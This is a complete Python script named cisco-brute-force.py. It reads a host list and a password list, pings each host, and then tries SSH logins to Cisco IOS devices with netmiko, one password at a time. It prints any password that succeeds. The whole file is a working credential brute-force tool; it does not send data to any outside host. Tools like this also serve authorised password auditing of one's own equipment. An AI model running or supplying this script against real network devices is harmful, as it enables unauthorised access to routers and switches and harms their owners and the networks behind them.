#!/usr/bin/python

from __future__ import print_function
from __future__ import unicode_literals
from netmiko import ConnectHandler
import pyping
import argparse
import os
import paramiko
from netmiko import NetMikoTimeoutException, NetMikoAuthenticationException

os.system('cls' if os.name == 'nt' else 'clear')
print('''
+--------------------------------------------------------------------------+
|                                                                          |
| cisco-brute-force.py                                                     |
|                                                                          |
| Written by: Chris Jones (ipv6freely@gmail.com)                           |
|                                                                          |
+--------------------------------------------------------------------------+
''')

def processargs():
    parser = argparse.ArgumentParser(description='Brute Force Logins to Cisco Devices')
    parser.add_argument('-i','--input', help='Input file of hosts to brute force',required=True)
    parser.add_argument('-p','--passwordlist', help='Input file of passwords to try',required=True)
    parser.add_argument('-u','--username', help='Username for login attempts',required=True)
    parser.add_argument('-f','--failures', help='Print Auth/Timeout Failures',required=False,action='store_true')
    args = parser.parse_args()
    return args.input, args.passwordlist, args.username, args.failures

def grabhosts(inputfile):
    try:
        print(">>> Importing list of hosts from",inputfile,"... ",end="")
        hostlist = open(inputfile,'r').read().split('\n')
        print("SUCCESS!")
        return hostlist
    except: 
        print ("FAILED! \n\n>>> Exiting.\n")
        quit()

def grabpasswords(passwordfile):
    try:
        print("\n>>> Importing list of passwords from",passwordfile,"... ",end="")
        passwordlist = open(passwordfile,'r').read().split('\n')
        print("SUCCESS!")
        return passwordlist
    except: 
        print ("FAILED! \n\n>>> Exiting.\n")
        quit()

def pinghost(host):

    result = pyping.ping(host.strip())
    return result.ret_code # 0 = pings, 1 = no ping

def hostconnect(host,username,password,failures):
    try: #attempt to SSH
        net_connect = ConnectHandler(device_type="cisco_ios_ssh", ip=host, username=username, password=password, global_delay_factor=30)
        return password
    except NetMikoTimeoutException as err:
        if failures:
            print("T",end="")
        timeout = "timeout"
        return timeout
    except NetMikoAuthenticationException as err:
        if failures:
            print("A",end="")
        return
    except:
        return

def main():

    user = os.getenv("SUDO_USER")
    if user is None:
        print ("\n\n!!! This program needs 'sudo' !!!\n\nExiting.\n\n")
        exit()

    paramiko.util.log_to_file("cisco-brute-force.log")

    inputfile, passwordfile, username, failures = processargs()

    hostlist = grabhosts(inputfile)
    passwordlist = grabpasswords(passwordfile)

    pingfail = 0

    if failures:
        print("\nFAILURE MARKS: ON\nT = Connection Timed-Out\nA = Authentication Failed")

    print("\n","="*75,"\n",end="",sep="")

    for host in hostlist:
        print ("\nPinging ",host,": ",end="",sep="")
        if pinghost(host) == 0:
            print("OK! Logging in: ",end="",sep="")
            goodpassword = ""
            timeout = False
            for password in passwordlist:
                result = hostconnect(host,username,password,failures)
                if result == "timeout":
                    timeout = True
                    break
                elif result:
                    goodpassword = result
                    break
            if goodpassword:
                print("SUCCESS! Password is:",goodpassword,end="")
            elif timeout:
                print("SSH TIMEOUT! Skipping...",end="")
            else:
                print("NO PASSWORD!",end="")
        else:
            print("FAILED. Skipping...")
            pingfail = pingfail + 1
            continue
    print("\n\n",pingfail,"Hosts didn't ping.")

if __name__ == '__main__':
    try:
        main()
        print("\n\n")
    except KeyboardInterrupt:
        print("\n\nCTRL+C Pressed. Exiting.\n\n")
        pass

exit()